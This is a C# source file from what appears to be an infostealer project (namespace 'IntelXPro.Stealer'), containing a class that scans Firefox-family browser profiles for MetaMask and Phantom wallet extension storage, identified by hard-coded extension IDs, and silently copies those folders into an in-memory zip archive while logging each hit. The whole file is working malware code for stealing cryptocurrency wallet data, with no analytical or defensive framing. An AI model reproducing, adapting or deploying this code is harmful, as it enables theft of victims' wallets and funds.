using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Browsers.Extentions
{
    internal class CryptoGecko : ITarget
    {
        private readonly List<string[]> GeckoWalletsDirectories = new List<string[]>
    {
        new string[2] { "Metamask Wallet", "7d61b592-e488-4f55-bf12-8d0ae55fd100" },
        new string[2] { "Metamask Wallet", "bb29e575-946e-4e69-b956-f73aec0a9927" },
        new string[2] { "Phantom Wallet", "e212a176-a331-462c-a024-d2f9027f15fc" },
        new string[2] { "Phantom Wallet", "a02b2aab-5dca-4649-93cf-f6a34860fbd5" }
    };

        public void Collect(InMemoryZip zip, Counter counter)
        {
            Parallel.ForEach(Paths.Gecko, delegate (string browser)
            {
                if (Directory.Exists(browser))
                {
                    Parallel.ForEach(Directory.GetDirectories(browser), delegate (string profile)
                    {
                        string browsername = Paths.GetBrowserName(browser);
                        string profilename = Path.GetFileName(profile);
                        Task.Run(delegate
                        {
                            GetGeckoWallets(zip, counter, profile, profilename, browsername);
                        });
                    });
                }
            });
        }

        private void GetGeckoWallets(InMemoryZip zip, Counter counter, string profilePath, string profilename, string browserName)
        {
            string extensionsPath = Path.Combine(profilePath, "storage", "default");
            if (!Directory.Exists(extensionsPath))
            {
                return;
            }
            Parallel.ForEach(GeckoWalletsDirectories, delegate (string[] walletInfo)
            {
                string text = walletInfo[1];
                string[] directories = Directory.GetDirectories(extensionsPath, "moz-extension+++" + text + "*", SearchOption.TopDirectoryOnly);
                foreach (string text2 in directories)
                {
                    try
                    {
                        string text3 = browserName + "_" + profilename + " " + walletInfo[0];
                        zip.AddDirectoryFiles(text2, text3);
                        counter.CryptoChromium.Add(text2 + " => " + text3);
                    }
                    catch
                    {
                    }
                }
            });
        }
    }
}
